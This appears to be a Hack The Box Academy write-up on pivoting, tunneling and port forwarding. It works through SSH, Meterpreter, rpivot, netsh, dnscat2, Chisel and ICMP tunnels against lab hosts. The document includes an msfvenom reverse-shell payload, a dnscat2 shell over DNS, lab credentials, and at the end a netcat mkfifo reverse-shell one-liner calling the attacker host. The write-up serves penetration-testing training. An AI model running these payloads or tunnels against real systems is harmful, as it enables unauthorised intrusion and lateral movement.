## Pivoting, Tunneling, and Port Forwarding   
Once a foothold is gained during an assessment, it may be in scope to move laterally and vertically within a target network. Using one compromised machine to access another is called pivoting and allows us to access networks and resources that are not directly accessible to us through the compromised host. Port forwarding accepts the traffic on a given IP address and port and redirects it to a different IP address and port combination. Tunneling is a technique that allows us to encapsulate traffic within another protocol so that it looks like a benign traffic stream.

# Questions and Answers: 

## Dynamic Port Forwarding with SSH and SOCKS Tunneling

 *SSH with user "ubuntu" and password "HTB_@cademy_stdnt!"*

* **You have successfully captured credentials to an external facing Web Server. Connect to the target and list the network interfaces. How many network interfaces does the target web server have? (Including the loopback interface)**

I began by connecting to the SSH server using the following command:
```bash
ssh -D 9050 ubuntu@10.129.144.206
```
After successfully logging in, I enumerated the network interfaces with:
```bash
ubuntu@WEB01:~$ ifconfig

ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.144.206  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 fe80::250:56ff:feb0:403a  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::250:56ff:feb0:403a  prefixlen 64  scopeid 0x0<global>
        ether 00:50:56:b0:40:3a  txqueuelen 1000  (Ethernet)
        RX packets 1350  bytes 117241 (117.2 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 155  bytes 16860 (16.8 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens224: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.5.129  netmask 255.255.254.0  broadcast 172.16.5.255
        inet6 fe80::250:56ff:feb0:2f8  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b0:02:f8  txqueuelen 1000  (Ethernet)
        RX packets 99  bytes 8340 (8.3 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 52  bytes 3910 (3.9 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 352  bytes 27739 (27.7 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 352  bytes 27739 (27.7 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

* **Apply the concepts taught in this section to pivot to the internal network and use RDP (credentials: victor:pass@123) to take control of the Windows target on 172.16.5.19. Submit the contents of Flag.txt located on the Desktop.**


To verify that my pivot was functioning correctly, I ran the following Nmap command:

```bash
nmap -v -sV -p9050 localhost
```
The results confirmed that port 9050 was open and running tor-socks, indicating that the pivot was set up properly.

Next, I used Metasploit with ProxyChains to scan for RDP services:
```bash
proxychains msfconsole
search rdp_scanner
use auxiliary/scanner/rdp/rdp_scanner
set rhosts 172.16.5.19
run
```

The scan confirmed that RDP was enabled on 172.16.5.19:3389 with the following details:
```bash
Hostname: DC01
Domain: INLANEFREIGHT
FQDN: DC01.inlanefreight.local
OS Version: Windows Server 2019 (10.0.17763)
Network Level Authentication (NLA): Disabled
```

I then attempted to connect to the Windows host using ProxyChains and xfreerdp with the credentials HTB provided:

```bash
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```
The connection was successful, granting me access to the remote desktop. Navigating to the Desktop directory, I found the flag and retrieved it.

[![Screenshot-2025-03-03-083203.png](https://i.postimg.cc/BnSkc3gN/Screenshot-2025-03-03-083203.png)](https://postimg.cc/56rsbZDF)


## Remote/Reverse Port Forwarding with SSH

*SSH with user "ubuntu" and password "HTB_@cademy_stdnt!"*
* **Which IP address assigned to the Ubuntu server Pivot host allows communication with the Windows server target? (Format: x.x.x.x)**

To begin, I connected to the SSH server using dynamic port forwarding with the following command:
```bash
ssh -D 9050 ubuntu@10.129.142.166
```
Once connected, I enumerated the network interfaces using:
```bash
ubuntu@WEB01:~$ ifconfig

ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.142.166  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 dead:beef::250:56ff:feb0:1692  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:feb0:1692  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b0:16:92  txqueuelen 1000  (Ethernet)
        RX packets 3733  bytes 311318 (311.3 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 294  bytes 26883 (26.8 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens224: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.5.129  netmask 255.255.254.0  broadcast 172.16.5.255
        inet6 fe80::250:56ff:feb0:8a2f  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b0:8a:2f  txqueuelen 1000  (Ethernet)
        RX packets 141  bytes 11147 (11.1 KB)
        RX errors 0  dropped 14  overruns 0  frame 0
        TX packets 128  bytes 9526 (9.5 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 697  bytes 54902 (54.9 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 697  bytes 54902 (54.9 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```
The output revealed three interfaces, one of which was ens224, assigned the IP address **172.16.5.129**. This indicated that the machine was part of a private network that granted communication with the Windows server target

* **What IP address is used on the attack host to ensure the handler is listening on all IP addresses assigned to the host? (Format: x.x.x.x)**

When setting up a listener (e.g., for a reverse shell, Meterpreter handler, or any other network service), `0.0.0.0` ensures that the service listens on all available network interfaces rather than a specific one.


## Meterpreter Tunneling & Port Forwarding

* **What two IP addresses can be discovered when attempting a ping sweep from the Ubuntu pivot host? (Format: x.x.x.x,x.x.x.x)**

I connected to the SSH server using dynamic port forwarding with the following command:

```c
ssh -D 9050 ubuntu@10.129.135.184
```
Next, I generated a Meterpreter payload for the Ubuntu server using msfvenom:

```c
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.162 LPORT=8080 -f elf -o shell

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of elf file: 250 bytes
Saved as: shell

```

I ran the following command to copy the payload to the Ubuntu server using scp:
```c
scp /home/htb-ac-1310789/shell ubuntu@10.129.135.184:/home/ubuntu

ubuntu@10.129.135.184's password: 
shell                                                                                                                                                      100%  250    26.6KB/s   00:00
```

I then set up and started the multi/handler in Metasploit to listen for the reverse connection:
```c
msfconsole -q
[msf](Jobs:0 Agents:0) >> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lhost 0.0.0.0
lhost => 0.0.0.0
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set lport 8080
lport => 8080
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run

[*] Started reverse TCP handler on 0.0.0.0:8080 
```

After that I executed the payload on the pivot host with following commands:

```c 
ubuntu@WEB01:~$ ls
shell
ubuntu@WEB01:~$ chmod +x shell
ubuntu@WEB01:~$ ./shell
```
This successfully initiated the reverse TCP connection, and we received a Meterpreter session:
```c
[*] Started reverse TCP handler on 0.0.0.0:8080 
[*] Sending stage (3045380 bytes) to 10.129.135.184
[*] Meterpreter session 1 opened (10.10.14.162:8080 -> 10.129.135.184:47350) at 2025-03-03 11:12:38 -0600
```

After obtaining the Meterpreter session, I ran a ping sweep on the Ubuntu server to identify other live hosts in the network range:
```c
Meterpreter 1)(/home/ubuntu) > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
[*] Performing ping sweep for IP range 172.16.5.0/23
[+] 172.16.5.19 host found
[+] 172.16.5.129 host found
```

* **Which of the routes that AutoRoute adds allows 172.16.5.19 to be reachable from the attack host? (Format: x.x.x.x/x.x.x.x)**

To enable routing to the subnet 172.16.5.0/23 through the compromised pivot host, I used the following Meterpreter command:

```c
run autoroute -s 172.16.5.0/23
```
The output indicated that the route was successfully added:

```c
[+] Added route to 172.16.5.0/255.255.254.0 via 10.129.135.184
```

## Web Server Pivoting with Rpivot

* **From which host will rpivot's server.py need to be run from? The Pivot Host or Attack Host? Submit Pivot Host or Attack Host as the answer.**

From reading the module we know we must run the server.py from the Attack Host.

* **From which host will rpivot's client.py need to be run from? The Pivot Host or Attack Host. Submit Pivot Host or Attack Host as the answer.**

From reading the module we know we must run the client.py from the Pivot Host.

 * **Using the concepts taught in this section, connect to the web server on the internal network. Submit the flag presented on the home page as the answer**

I initiated the server.py script to listen for incoming connections from the pivot machine:

```c
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

Next, I copied the rpivot directory to the pivot machine using scp:

```c
scp -r rpivot ubuntu@10.129.172.125:/home/ubuntu/
```

Once the files were transferred, I logged into the pivot machine using the provided HTB credentials:

```c
ssh ubuntu@10.129.172.125
```

Inside the pivot machine, I started the client.py script to establish a connection back to my attack machine:

```c
python2.7 client.py --server-ip 10.10.14.162 --server-port 9999
```

At this point, I attempted to access the target using proxychains with Firefox:
```c
proxychains firefox http://10.129.172.125
```

Instead, I used curl with the SOCKS proxy to directly access the target machine and retrieve the flag:
```c
curl --socks4 127.0.0.1:9050 172.16.5.135

--socks4 127.0.0.1:9050: Routes traffic through the SOCKS proxy established via rpivot.
```
[![Screenshot-2025-03-04-124019.png](https://i.postimg.cc/CMj0997p/Screenshot-2025-03-04-124019.png)](https://postimg.cc/yWY2ZQ2L)


## Port Forwarding with Windows Netsh

* *RDP to 10.129.42.198 (ACADEMY-PIVOTING-WIN10PIV) with user "htb-student" and password "HTB_@cademy_stdnt!"*

* **Using the concepts covered in this section, take control of the DC (172.16.5.19) using xfreerdp by pivoting through the Windows 10 target host. Submit the approved contact's name found inside the "VendorContacts.txt" file located in the "Approved Vendors" folder on Victor's desktop (victor's credentials: victor:pass@123) . (Format: 1 space, not case-sensitive)**


I started by connecting to the Windows 10 target (10.129.42.198) using xfreerdp:

```c
xfreerdp /v:10.129.42.198 /u:htb-student /p:HTB_@cademy_stdnt!
```

Once inside the Windows machine, I launched Command Prompt with Administrator Privileges to execute the necessary port forwarding commands.

To forward external traffic from port 8080 on the Windows machine to the internal RDP service (172.16.5.19:3389), I ran:
```c
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.19
```

I confirmed that the rule was added successfully with: 
```c
netsh.exe interface portproxy show v4tov4

Listen on ipv4:             Connect to ipv4:
--------------------------------------------------
Address         Port        Address         Port
10.129.42.198   8080        172.16.5.19     3389
```
Back on my Linux attack machine, I attempted an RDP connection to the internal machine by connecting to the Windows machine’s port 8080:

```c
xfreerdp /v:10.129.42.198:8080 /u:victor /p:pass@123
```

Once inside, I navigated to the Approved Vendors folder and opened the VendorContacts.txt file to retrieve the flag.

[![Screenshot-2025-03-04-153024.png](https://i.postimg.cc/MpJBbn5J/Screenshot-2025-03-04-153024.png)](https://postimg.cc/MvtXzKg9)


## DNS Tunneling with Dnscat2

*RDP to 10.129.42.198 (ACADEMY-PIVOTING-WIN10PIV) with user "htb-student" and password "HTB_@cademy_stdnt!"*

* **Using the concepts taught in this section, connect to the target and establish a DNS Tunnel that provides a shell session. Submit the contents of C:\Users\htb-student\Documents\flag.txt as the answer.**

I first established an RDP connection to the Windows machine using xfreerdp:
```c
xfreerdp /v:10.129.42.198 /u:htb-student /p:HTB_@cademy_stdnt!
```

Once connected, I proceeded to set up the dnscat2 server on my attack machine. In a new terminal tab, I launched the dnscat2 server to listen for incoming DNS traffic:
```c
sudo ruby dnscat2.rb --dns host=10.10.14.162,port=53,domain=inlanefreight.local --no-cache
```
On my attack machine, I cloned the dnscat2 PowerShell client repository:
```c
git clone https://github.com/lukebaggett/dnscat2-powershell.git
```
To transfer the dnscat2 client to the compromised Windows machine, I simply copied and pasted the dnscat2.ps1 script to the Desktop of the RDP session.

Next, I opened PowerShell on the Windows host and navigated to the Desktop where I placed dnscat2.ps1.

I then imported the module and established a connection to my dnscat2 server:
```c
> Import-Module .\dnscat2.ps1
PS C:\Users\htb-student\Desktop\dnscat2-powershell> Start-Dnscat2 -DNSserver 10.10.14.162 -Domain inlanefreight.local -PreSharedSecret f5c900b45f2feedcf213c4edb1906de9 -Exec cmd
```

I successfully established a session in dnscat2. I interacted with the active session:
```c
session -i 1
```
Once inside, I navigated to the target folder and displayed the flag:
```c
cd C:\Users\htb-student\Documents\
type flag.txt 
```
[![Screenshot-2025-03-05-093531.png](https://i.postimg.cc/DftH8Bm1/Screenshot-2025-03-05-093531.png)](https://postimg.cc/MXmdL07G)


## SOCKS5 Tunneling with Chisel

*SSH to with user "ubuntu" and password "HTB_@cademy_stdnt!"*

* **Using the concepts taught in this section, connect to the target and establish a SOCKS5 Tunnel that can be used to RDP into the domain controller (172.16.5.19, victor:pass@123). Submit the contents of C:\Users\victor\Documents\flag.txt as the answer.**

I began by connecting to the Ubuntu server using SSH:
```c
ssh ubuntu@10.129.202.64
```
Since the default version of Chisel was incompatible with the target, I downloaded an older version (v1.7.7) from GitHub:
```c
wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
gunzip chisel_1.7.7_linux_amd64.gz
chmod +x chisel_1.7.7_linux_amd64
mv chisel_1.7.7_linux_amd64 chisel
```
I copied it to the home directory of the Ubuntu server:
```c
scp chisel ubuntu@10.129.202.64:~/
```

I edited the ProxyChains configuration file on the attack host to add a SOCKS5 proxy on port 1080 to enable pivoting:
```c
sudo nano /etc/proxychains.conf
```
At the end of the configuration file, I added the following line to define the proxy:

```c
socks5 127.0.0.1 1080
```
With the proxy configuration in place, I used ProxyChains and xfreerdp to connect to the Windows Domain Controller on 172.16.5.19:
```c
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```
After successfully connecting, I navigated to the appropriate location and retrieved the flag from the system.

[![Screenshot-2025-03-06-111229.png](https://i.postimg.cc/rmZ9cVNf/Screenshot-2025-03-06-111229.png)](https://postimg.cc/VrMtWcTt)

## ICMP Tunneling with SOCKS

*SSH to  with user "ubuntu" and password "HTB_@cademy_stdnt!"*

* **Using the concepts taught thus far, connect to the target and establish an ICMP tunnel. Pivot to the DC (172.16.5.19, victor:pass@123) and submit the contents of C:\Users\victor\Downloads\flag.txt as the answer**

First, I cloned the Ptunnel-ng repository from GitHub:
```c
git clone https://github.com/utoni/ptunnel-ng.git
```
Then, I navigated to the cloned directory and ran the autogen.sh script to set up the build environment:

```c
cd ptunnel-ng 
sudo ./autogen.sh
```

Once the setup was complete, I copied the Ptunnel-ng directory to the pivot host (Ubuntu server) using SCP:
```c
scp -r ptunnel-ng ubuntu@10.129.202.64:~/
```

Next, I connected to the Ubuntu pivot host via SSH:
```c
ssh ubuntu@10.129.202.64
```
Once logged in, I navigated to the Ptunnel-ng directory and started the Ptunnel-ng server, specifying the target Windows host (172.16.5.19) and the RDP port (3389):
```c
sudo ./ptunnel-ng -r172.16.5.19 -R3389
```
On my attack machine, I initiated a Ptunnel-ng client connection to the pivot host (10.129.202.64). This set up a local listener on port 3388, which forwarded traffic to the Windows RDP service on 172.16.5.19:3389:
```c
sudo ./ptunnel-ng -p10.129.202.64 -l3388 -r172.16.5.19 -R3389
```
With the tunnel established, I connected to the Windows machine using xfreerdp, directing traffic through the local listener (127.0.0.1:3388):
```c
freerdp /v:127.0.0.1:3388 /u:victor /p:pass@123
```
After successfully connecting, I navigated to the appropriate location and retrieved the flag from the system.

[![Screenshot-2025-03-06-141351.png](https://i.postimg.cc/BbtmkhRP/Screenshot-2025-03-06-141351.png)](https://postimg.cc/vxF76vYG)


# Skills Assessment

## Scenario

A team member started a Penetration Test against the Inlanefreight environment but was moved to another project at the last minute. Luckily for us, they left a web shell in place for us to get back into the network so we can pick up where they left off. We need to leverage the web shell to continue enumerating the hosts, identifying common services, and using those services/protocols to pivot into the internal networks of Inlanefreight. Our detailed objectives are below:

## Objectives

* Start from external (Pwnbox or your own VM) and access the first system via the web shell left in place.
* Use the web shell access to enumerate and pivot to an internal host.
* Continue enumeration and pivoting until you reach the Inlanefreight Domain Controller and capture the associated flag.
* Use any data, credentials, scripts, or other information within the environment to enable your pivoting attempts.
* Grab any/all flags that can be found.

### **Note:**

**Keep in mind the tools and tactics you practiced throughout this module. Each one can provide a different route into the next pivot point. You may find a hop to be straightforward from one set of hosts, but that same tactic may not work to get you to the next. While completing this skills assessment, we encourage you to take proper notes, draw out a map of what you know of already, and plan out your next hop. Trying to do it on the fly will prove difficult without having a visual to reference.**


## Questions and Answers: 

* **Once on the webserver, enumerate the host for credentials that can be used to start a pivot or tunnel to another host in the network. In what user's directory can you find the credentials? Submit the name of the user as the answer.**

I started by navigating to the home directory and found two user accounts:
```c
www-data@inlanefreight.local:/home# cd /home
www-data@inlanefreight.local:/home# ls
administrator
webadmin
```
I checked the administrator directory, but it was empty. Next, I inspected the webadmin directory:
```c
www-data@inlanefreight.local:/home/webadmin# ls
for-admin-eyes-only
id_rsa
```
I used cat to read the for-admin-eyes-only file:
```c
www-data@inlanefreight.local:/home/webadmin# cat for-admin-eyes-only
# note to self,
in order to reach server01 or other servers in the subnet from here you have to us the user account:mlefay
with a password of :
Plain Human work!
```

* **Submit the credentials found in the user's home directory. (Format: user:password)**
The credentials found in the user's home directory are:

*mlefay:Plain Human work!*

* **Enumerate the internal network and discover another active host. Submit the IP address of that host as the answer.**


I tried different ways to enumerate the internal network but it wasn't posibble to do with the web shell, I created a reverse shell

started a nc connection on the attack host

nc -lvnp 9090


and a netcat reverse shell on the web shell

www-data@inlanefreight.local:/home/webadmin# rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.93 9090 > /tmp/f

